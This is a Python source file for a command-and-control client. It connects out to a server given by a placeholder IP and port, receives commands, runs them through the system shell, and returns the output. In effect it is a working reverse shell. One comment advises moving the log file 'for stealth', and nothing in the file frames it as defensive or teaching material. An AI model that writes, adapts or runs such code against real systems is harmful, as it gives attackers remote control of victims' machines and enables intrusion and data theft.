import socket
import subprocess
import logging
import os
import sys
from pathlib import Path

# Configure logging to file (change path as needed for stealth)
log_path = Path.home() / '.c2_client.log'
logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants for server connection
DEFAULT_HOST_IP = '127.0.0.1'  # Change this to your C2 server IP
DEFAULT_HOST_PORT = 2222       # Change this to your C2 server port

def connect_to_server(host_ip, host_port):
    """
    Establishes a connection to the C2 server.
    Args:
        host_ip (str): The IP address of the server.
        host_port (int): The port number of the server.
    Returns:
        socket object if connected successfully, None otherwise.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host_ip, host_port))
        logging.info(f'Connected to {host_ip}:{host_port}')
        return sock
    except socket.error as e:
        logging.error(f'Failed to connect to {host_ip}:{host_port} - {e}')
        return None

def execute_command(command):
    """
    Executes a system command.
    Args:
        command (str): The command to execute.
    Returns:
        str: The output of the command.
    """
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        logging.error(f'Command execution error: {e}')
        return str(e)

def session_handler(sock):
    """
    Handles the communication session with the C2 server.
    Args:
        sock (socket): The socket object connected to the server.
    """
    try:
        while True:
            logging.debug('Awaiting command from server...')
            command = sock.recv(1024).decode()

            if not command:
                logging.warning('No command received. Connection might be closed.')
                break

            if command.lower() == 'exit':
                logging.info('The server has terminated the session.')
                break

            logging.info(f'Executing command: {command}')
            result = execute_command(command)
            sock.send(result.encode())

    except KeyboardInterrupt:
        logging.info('Keyboard interrupt issued.')
    except socket.error as e:
        logging.error(f'Socket error occurred: {e}')
    except Exception as e:
        logging.error(f'Unexpected error occurred: {e}')
    finally:
        sock.close()
        logging.info('Connection closed.')

def main(host_ip=DEFAULT_HOST_IP, host_port=DEFAULT_HOST_PORT):
    """
    Main function to establish connection and handle session.
    Args:
        host_ip (str): IP address of the server.
        host_port (int): Port number of the server.
    """
    sock = connect_to_server(host_ip, host_port)
    if sock:
        session_handler(sock)

if __name__ == '__main__':
    if len(sys.argv) == 3:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        main(host_ip, host_port)
    else:
        main()
